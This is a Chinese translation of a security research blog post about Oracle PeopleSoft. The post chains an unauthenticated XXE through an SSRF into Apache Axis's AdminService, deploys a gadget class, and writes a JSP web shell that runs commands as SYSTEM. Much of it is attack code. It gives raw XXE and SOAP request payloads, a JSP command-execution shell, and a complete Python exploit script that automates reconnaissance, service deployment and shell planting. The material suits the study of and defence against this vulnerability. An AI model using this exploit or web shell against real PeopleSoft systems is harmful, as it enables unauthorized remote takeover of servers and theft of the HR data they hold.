> 原文链接: https://www.anquanke.com//post/id/106834 


# ORACLE PEOPLESOFT远程执行代码：将XXE盲注到SYSTEM SHELL


                                阅读量   
                                **95852**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">5</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：www.ambionics.io
                                <br>原文地址：[https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce](https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t0111977898dc371b19.png)](https://p3.ssl.qhimg.com/t0111977898dc371b19.png)



## Oracle PeopleSoft

几个月前，我有机会审核了几个Oracle PeopleSoft解决方案，包括PeopleSoft HRMS和PeopleTool。

`PeopleSoft`应用程序使用 了很多不同的端点，其中很 多端点未经过身份验 证。其中也有很多服务是使用了默认密码。导致它在安全方面非常不稳固。

本文以一种通用的方式将XXE载荷转换为系统运行命令（可能影响每个PeopleSoft版本）。



## XXE：访问本地网络

我们之前已经了解了多个XXE，例如CVE-2013-3800或CVE-2013-3821。最后记录的示例是ERPScan的CVE-2017-3548。通常可以利用它们提取PeopleSoft和WebLogic控制台的凭据。但是这两个控制台并没有提供一种简单的获取`shell`的方法。此外 ，我们假设服务设置有防火墙， 因此本文中我们无法从本地文件轻松获取 数据（假装）。

CVE-2013-3821:

```
POST /PSIGW/HttpListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE IBRequest [
&lt;!ENTITY x SYSTEM "http://localhost:51420"&gt;
]&gt;
&lt;IBRequest&gt;
   &lt;ExternalOperationName&gt;&amp;x;&lt;/ExternalOperationName&gt;
   &lt;OperationType/&gt;
   &lt;From&gt;&lt;RequestingNode/&gt;
      &lt;Password/&gt;
      &lt;OrigUser/&gt;
      &lt;OrigNode/&gt;
      &lt;OrigProcess/&gt;
      &lt;OrigTimeStamp/&gt;
   &lt;/From&gt;
   &lt;To&gt;
      &lt;FinalDestination/&gt;
      &lt;DestinationNode/&gt;
      &lt;SubChannel/&gt;
   &lt;/To&gt;
   &lt;ContentSections&gt;
      &lt;ContentSection&gt;
         &lt;NonRepudiation/&gt;
         &lt;MessageVersion/&gt;
         &lt;Data&gt;&lt;![CDATA[&lt;?xml version="1.0"?&gt;your_message_content]]&gt;
         &lt;/Data&gt;
      &lt;/ContentSection&gt;
   &lt;/ContentSections&gt;
&lt;/IBRequest&gt;
```

CVE-2017-3548:

```
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

&lt;!DOCTYPE a PUBLIC "-//B/A/EN" "C:windows"&gt;
```

我们将使用XXE作为从本地主机到达各种服务的一种方式，这种方式可能会绕过防火墙规则或授权检查。唯一的小问题是找到对应服务所绑定的本地端口，我们可以通过`cookie`访问主页时获得该信息:

```
Set-Cookie: SNP2118-51500-PORTAL-PSJSESSIONID=9JwqZVxKjzGJn1s5DLf1t46pz91FFb3p!-1515514079;
```

在这种情况下，可以看出端口是51500。我们可以通过 `http://localhost:51500/`从 内部到达应用程序。



## Apache Axis

许多未经身份验证的服务，其中就包括`Apache Web`服务器，位于URL `http://website.com/pspc/services`下。`Apache Axis`允许您使用Java类构建SOAP端点，使用方法是通过生成它们的WSDL和辅助代码来与它们交互。为了管理它，必须与此目录下的`AdminService`进行交互:`http://website.com/pspc/services/AdminService`

``<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t017343482049eeb9a0.png)



例如，以下是管理员根据java.util.Random类创 建端点:

```
POST /pspc/services/AdminService
Host: website.com
SOAPAction: something
Content-Type: application/xml
...

&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
    &lt;soapenv:Body&gt;
        &lt;ns1:deployment
            xmlns="http://xml.apache.org/axis/wsdd/"
            xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
            xmlns:ns1="http://xml.apache.org/axis/wsdd/"&gt;
            &lt;ns1:service name="RandomService" provider="java:RPC"&gt;
                &lt;ns1:parameter name="className" value="java.util.Random"/&gt;
                &lt;ns1:parameter name="allowedMethods" value="*"/&gt;
            &lt;/ns1:service&gt;
        &lt;/ns1:deployment&gt;
    &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
```

如上所示，java.util.Random的每个公共方法都将作为web服务提供。<br>
通过SOAP调用Random.nextInt()是这样的:

```
POST /pspc/services/RandomService
Host: website.com
SOAPAction: something
Content-Type: application/xml
...

&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
    &lt;soapenv:Body&gt;
        &lt;api:nextInt /&gt;
    &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
```

它会回应：

```
HTTP/1.1 200 OK
...

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;soapenv:Envelope
    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:xsd="http://www.w3.org/2001/XMLSchema"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
    &lt;soapenv:Body&gt;
        &lt;ns1:nextIntResponse
            soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
            xmlns:ns1="http://127.0.0.1/Integrics/Enswitch/API"&gt;
            &lt;nextIntReturn href="#id0"/&gt;
        &lt;/ns1:nextIntResponse&gt;
        &lt;multiRef id="id0" soapenc:root="0"
            soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
            xsi:type="xsd:int"
            xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"&gt;
            1244788438 &lt;!-- Here's our random integer --&gt;
        &lt;/multiRef&gt;
    &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
```

此管理端点阻止外部IP访问。但从本地主机到达时不需要密码，这使其成为开发的理想选择。

由于我们使用的是XXE，因此使用POST请求是不可能的，所以我们需要一种将SOAP有效载荷转换为GET的方法。



## Axis : POST到GET

Axis API允许我们发送GET请求。它接收给定的URL参数并将它们转换为SOAP有效载荷。以下是把Axis源代码的GET参数转换为XML有效负载的代码:

```
public class AxisServer extends AxisEngine `{`
    [...]
    `{`
        String method = null;
        String args = "";
        Enumeration e = request.getParameterNames();

        while (e.hasMoreElements()) `{`
            String param = (String) e.nextElement();
            if (param.equalsIgnoreCase ("method")) `{`
                method = request.getParameter (param);
            `}`

            else `{`
                args += "&lt;" + param + "&gt;" + request.getParameter (param) +
                        "&lt;/" + param + "&gt;";
            `}`
        `}`

        String body = "&lt;" + method + "&gt;" + args + "&lt;/" + method + "&gt;";
        String msgtxt = "&lt;SOAP-ENV:Envelope" +
                " xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"&gt;" +
                "&lt;SOAP-ENV:Body&gt;" + body + "&lt;/SOAP-ENV:Body&gt;" +
                "&lt;/SOAP-ENV:Envelope&gt;";
    `}`
`}`
```

要理解它是如何工作的，最好使用一个例子：

```
GET /pspc/services/SomeService
     ?method=myMethod
     &amp;parameter1=test1
     &amp;parameter2=test2
```

相当于:

```
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
    &lt;soapenv:Body&gt;
        &lt;myMethod&gt;
            &lt;parameter1&gt;test1&lt;/parameter1&gt;
            &lt;parameter2&gt;test2&lt;/parameter2&gt;
        &lt;/myMethod&gt;
    &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
```

不过，当我们尝试使用此方法设置新端点时会出现问题:我们必须有XML标签属性,并且`code`也通过不了。<br>
当我们尝试将它们添加到GET请求时，例如：

```
GET /pspc/services/SomeService
     ?method=myMethod+attr0="x"
     &amp;parameter1+attr1="y"=test1
     &amp;parameter2=test2
```

以下是我们最终的结果：

```
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
    &lt;soapenv:Body&gt;
        &lt;myMethod attr0="x"&gt;
            &lt;parameter1 attr1="y"&gt;test1&lt;/parameter1 attr1="y"&gt;
            &lt;parameter2&gt;test2&lt;/parameter2&gt;
        &lt;/myMethod attr0="x"&gt;
    &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
```

很明显，这不是有效的XML，我们的请求被拒绝。<br>
如果我们将整个有效负载放在方法参数中，如下所示：

```
GET / pspc / services / SomeService
     ？method = myMethod + attr =“x”&gt; &lt;test&gt; y &lt;/ test&gt; &lt; / myMethod
```

有时候是这样的回应:

```
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
    &lt;soapenv:Body&gt;
        &lt;myMethod attr="x"&gt;&lt;test&gt;y&lt;/test&gt;&lt;/myMethod&gt;
        &lt;/myMethod attr="x"&gt;&lt;test&gt;y&lt;/test&gt;&lt;/myMethod&gt;
    &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
```

最终解决方案来自于使用XML注释：

```
GET /pspc/services/SomeService
     ?method=!--&gt;&lt;myMethod+attr="x"&gt;&lt;test&gt;y&lt;/test&gt;&lt;/myMethod
```

我们得到：

```
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
    &lt;soapenv:Body&gt;
        &lt;!--&gt;&lt;myMethod attr="x"&gt;&lt;test&gt;y&lt;/test&gt;&lt;/myMethod&gt;
        &lt;/!--&gt;&lt;myMethod attr="x"&gt;&lt;test&gt;y&lt;/test&gt;&lt;/myMethod&gt;
    &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
```

由于我们添加的前缀`!--&gt;`，第一个有效载荷便是`&lt;!--XML`开始，这是XML注释的开始。第二行开头`&lt;/!`接着是`--&gt;`，是 注释的结束。因此第一行被忽略，我们的有效载荷现在只被解释一次。

由此，我们可以将任何来自POST的SOAP请求转换为GET，这意味着我们可以将任何类作为`Axis`服务部署,使用XXE绕过IP检查。



## Axis:Gadgets

Apache Axis不允许我们在部署它们时上传我们自己的Java类; 因此我们必须与已有的漏洞结合。在PeopleSoft的包含了`Axis`实例的pspc.war中进行了一些研究之后，发现在org.apache.pluto.portalImpl包的类有一些有趣的方法。首先，addToEntityReg(String[] args)允许我们在XML文件的末尾添加任意数据。其次，copy(file1, file2)允许我们在任何地方使用复制。这足以获得一个shell，通过在我们的XML中插入一个JSP负载，并将其复制到`webroot`中。

如预期的那样，它作为SYSTEM运行，导致未经身份验证的远程系统攻击，仅来自XXE。

[![](https://p2.ssl.qhimg.com/t01ae1f00f7f5f04bc4.png)](https://p2.ssl.qhimg.com/t01ae1f00f7f5f04bc4.png)



## 利用

这个利用向量对于每个最近的PeopleSoft版本应该或多或少是通用的。XXE端点只需要修改。

```
#!/usr/bin/python3
# Oracle PeopleSoft SYSTEM RCE
# https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce
# cf
# 2017-05-17

import requests
import urllib.parse
import re
import string
import random
import sys


from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


try:
    import colorama
except ImportError:
    colorama = None
else:
    colorama.init()

    COLORS = `{`
        '+': colorama.Fore.GREEN,
        '-': colorama.Fore.RED,
        ':': colorama.Fore.BLUE,
        '!': colorama.Fore.YELLOW
    `}`


URL = sys.argv[1].rstrip('/')
CLASS_NAME = 'org.apache.pluto.portalImpl.Deploy'
PROXY = 'localhost:8080'

# shell.jsp?c=whoami
PAYLOAD = '&lt;%@ page import="java.util.*,java.io.*"%&gt;&lt;% if (request.getParameter("c") != null) `{` Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) `{` out.println(disr); disr = dis.readLine(); `}`; p.destroy(); `}`%&gt;'


class Browser:
    """Wrapper around requests.
    """

    def __init__(self, url):
        self.url = url
        self.init()

    def init(self):
        self.session = requests.Session()
        self.session.proxies = `{`
            'http': PROXY,
            'https': PROXY
        `}`
        self.session.verify = False

    def get(self, url ,*args, **kwargs):
        return self.session.get(url=self.url + url, *args, **kwargs)

    def post(self, url, *args, **kwargs):
        return self.session.post(url=self.url + url, *args, **kwargs)

    def matches(self, r, regex):
        return re.findall(regex, r.text)


class Recon(Browser):
    """Grabs different informations about the target.
    """

    def check_all(self):
        self.site_id = None
        self.local_port = None
        self.check_version()
        self.check_site_id()
        self.check_local_infos()

    def check_version(self):
        """Grabs PeopleTools' version.
        """
        self.version = None
        r = self.get('/PSEMHUB/hub')
        m = self.matches(r, 'Registered Hosts Summary - ([0-9.]+).&lt;/b&gt;')

        if m:
            self.version = m[0]
            o(':', 'PTools version: %s' % self.version)
        else:
            o('-', 'Unable to find version')

    def check_site_id(self):
        """Grabs the site ID and the local port.
        """
        if self.site_id:
            return

        r = self.get('/')
        m = self.matches(r, '/([^/]+)/signon.html')

        if not m:
            raise RuntimeError('Unable to find site ID')

        self.site_id = m[0]
        o('+', 'Site ID: ' + self.site_id)

    def check_local_infos(self):
        """Uses cookies to leak hostname and local port.
        """
        if self.local_port:
            return

        r = self.get('/psp/%s/signon.html' % self.site_id)

        for c, v in self.session.cookies.items():
            if c.endswith('-PORTAL-PSJSESSIONID'):
                self.local_host, self.local_port, *_ = c.split('-')
                o('+', 'Target: %s:%s' % (self.local_host, self.local_port))
                return

        raise RuntimeError('Unable to get local hostname / port')


class AxisDeploy(Recon):
    """Uses the XXE to install Deploy, and uses its two useful methods to get
    a shell.
    """

    def init(self):
        super().init()
        self.service_name = 'YZWXOUuHhildsVmHwIKdZbDCNmRHznXR' #self.random_string(10)

    def random_string(self, size):
        return ''.join(random.choice(string.ascii_letters) for _ in range(size))

    def url_service(self, payload):
        return 'http://localhost:%s/pspc/services/AdminService?method=%s' % (
            self.local_port,
            urllib.parse.quote_plus(self.psoap(payload))
        )

    def war_path(self, name):
        # This is just a guess from the few PeopleSoft instances we audited.
        # It might be wrong.
        suffix = '.war' if self.version and self.version &gt;= '8.50' else ''
        return './applications/peoplesoft/%s%s' % (name, suffix)

    def pxml(self, payload):
        """Converts an XML payload into a one-liner.
        """
        payload = payload.strip().replace('n', ' ')
        payload = re.sub('s+&lt;', '&lt;', payload, flags=re.S)
        payload = re.sub('s+', ' ', payload, flags=re.S)
        return payload

    def psoap(self, payload):
        """Converts a SOAP payload into a one-liner, including the comment trick
        to allow attributes.
        """
        payload = self.pxml(payload)
        payload = '!--&gt;%s' % payload[:-1]
        return payload

    def soap_service_deploy(self):
        """SOAP payload to deploy the service.
        """
        return """
        &lt;ns1:deployment xmlns="http://xml.apache.org/axis/wsdd/"
        xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
        xmlns:ns1="http://xml.apache.org/axis/wsdd/"&gt;
            &lt;ns1:service name="%s" provider="java:RPC"&gt;
                &lt;ns1:parameter name="className" value="%s"/&gt;
                &lt;ns1:parameter name="allowedMethods" value="*"/&gt;
            &lt;/ns1:service&gt;
        &lt;/ns1:deployment&gt;
        """ % (self.service_name, CLASS_NAME)

    def soap_service_undeploy(self):
        """SOAP payload to undeploy the service.
        """
        return """
        &lt;ns1:undeployment xmlns="http://xml.apache.org/axis/wsdd/"
        xmlns:ns1="http://xml.apache.org/axis/wsdd/"&gt;
        &lt;ns1:service name="%s"/&gt;
        &lt;/ns1:undeployment&gt;
        """ % (self.service_name, )

    def xxe_ssrf(self, payload):
        """Runs the given AXIS deploy/undeploy payload through the XXE.
        """
        data = """
        &lt;?xml version="1.0"?&gt;
        &lt;!DOCTYPE IBRequest [
        &lt;!ENTITY x SYSTEM "%s"&gt;
        ]&gt;
        &lt;IBRequest&gt;
           &lt;ExternalOperationName&gt;&amp;x;&lt;/ExternalOperationName&gt;
           &lt;OperationType/&gt;
           &lt;From&gt;&lt;RequestingNode/&gt;
              &lt;Password/&gt;
              &lt;OrigUser/&gt;
              &lt;OrigNode/&gt;
              &lt;OrigProcess/&gt;
              &lt;OrigTimeStamp/&gt;
           &lt;/From&gt;
           &lt;To&gt;
              &lt;FinalDestination/&gt;
              &lt;DestinationNode/&gt;
              &lt;SubChannel/&gt;
           &lt;/To&gt;
           &lt;ContentSections&gt;
              &lt;ContentSection&gt;
                 &lt;NonRepudiation/&gt;
                 &lt;MessageVersion/&gt;
                 &lt;Data&gt;
                 &lt;/Data&gt;
              &lt;/ContentSection&gt;
           &lt;/ContentSections&gt;
        &lt;/IBRequest&gt;
        """ % self.url_service(payload)
        r = self.post(
            '/PSIGW/HttpListeningConnector',
            data=self.pxml(data),
            headers=`{`
                'Content-Type': 'application/xml'
            `}`
        )

    def service_check(self):
        """Verifies that the service is correctly installed.
        """
        r = self.get('/pspc/services')
        return self.service_name in r.text

    def service_deploy(self):
        self.xxe_ssrf(self.soap_service_deploy())

        if not self.service_check():
            raise RuntimeError('Unable to deploy service')

        o('+', 'Service deployed')

    def service_undeploy(self):
        if not self.local_port:
            return

        self.xxe_ssrf(self.soap_service_undeploy())

        if self.service_check():
            o('-', 'Unable to undeploy service')
            return

        o('+', 'Service undeployed')

    def service_send(self, data):
        """Send data to the Axis endpoint.
        """
        return self.post(
            '/pspc/services/%s' % self.service_name,
            data=data,
            headers=`{`
                'SOAPAction': 'useless',
                'Content-Type': 'application/xml'
            `}`
        )

    def service_copy(self, path0, path1):
        """Copies one file to another.
        """
        data = """
        &lt;?xml version="1.0" encoding="utf-8"?&gt;
        &lt;soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
        &lt;soapenv:Body&gt;
        &lt;api:copy
        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;
            &lt;in0 xsi:type="xsd:string"&gt;%s&lt;/in0&gt;
            &lt;in1 xsi:type="xsd:string"&gt;%s&lt;/in1&gt;
        &lt;/api:copy&gt;
        &lt;/soapenv:Body&gt;
        &lt;/soapenv:Envelope&gt;
        """.strip() % (path0, path1)
        response = self.service_send(data)
        return '&lt;ns1:copyResponse' in response.text

    def service_main(self, tmp_path, tmp_dir):
        """Writes the payload at the end of the .xml file.
        """
        data = """
        &lt;?xml version="1.0" encoding="utf-8"?&gt;
        &lt;soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
        &lt;soapenv:Body&gt;
        &lt;api:main
        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;
            &lt;api:in0&gt;
                &lt;item xsi:type="xsd:string"&gt;%s&lt;/item&gt;
                &lt;item xsi:type="xsd:string"&gt;%s&lt;/item&gt;
                &lt;item xsi:type="xsd:string"&gt;%s.war&lt;/item&gt;
                &lt;item xsi:type="xsd:string"&gt;something&lt;/item&gt;
                &lt;item xsi:type="xsd:string"&gt;-addToEntityReg&lt;/item&gt;
                &lt;item xsi:type="xsd:string"&gt;&lt;![CDATA[%s]]&gt;&lt;/item&gt;
            &lt;/api:in0&gt;
        &lt;/api:main&gt;
        &lt;/soapenv:Body&gt;
        &lt;/soapenv:Envelope&gt;
        """.strip() % (tmp_path, tmp_dir, tmp_dir, PAYLOAD)
        response = self.service_send(data)

    def build_shell(self):
        """Builds a SYSTEM shell.
        """
        # On versions &gt;= 8.50, using another extension than JSP got 70 bytes
        # in return every time, for some reason.
        # Using .jsp seems to trigger caching, thus the same pivot cannot be
        # used to extract several files.
        # Again, this is just from experience, nothing confirmed
        pivot = '/%s.jsp' % self.random_string(20)
        pivot_path = self.war_path('PSOL') + pivot
        pivot_url = '/PSOL' + pivot

        # 1: Copy portletentityregistry.xml to TMP

        per = '/WEB-INF/data/portletentityregistry.xml'
        per_path = self.war_path('pspc')
        tmp_path = '../' * 20 + 'TEMP'
        tmp_dir = self.random_string(20)
        tmp_per = tmp_path + '/' + tmp_dir + per

        if not self.service_copy(per_path + per, tmp_per):
            raise RuntimeError('Unable to copy original XML file')

        # 2: Add JSP payload
        self.service_main(tmp_path, tmp_dir)

        # 3: Copy XML to JSP in webroot
        if not self.service_copy(tmp_per, pivot_path):
            raise RuntimeError('Unable to copy modified XML file')

        response = self.get(pivot_url)

        if response.status_code != 200:
            raise RuntimeError('Unable to access JSP shell')

        o('+', 'Shell URL: ' + self.url + pivot_url)


class PeopleSoftRCE(AxisDeploy):
    def __init__(self, url):
        super().__init__(url)


def o(s, message):
    if colorama:
        c = COLORS[s]
        s = colorama.Style.BRIGHT + COLORS[s] + '|' + colorama.Style.RESET_ALL
    print('%s %s' % (s, message))


x = PeopleSoftRCE(URL)

try:
    x.check_all()
    x.service_deploy()
    x.build_shell()
except RuntimeError as e:
    o('-', e)
finally:
    x.service_undeploy()
```
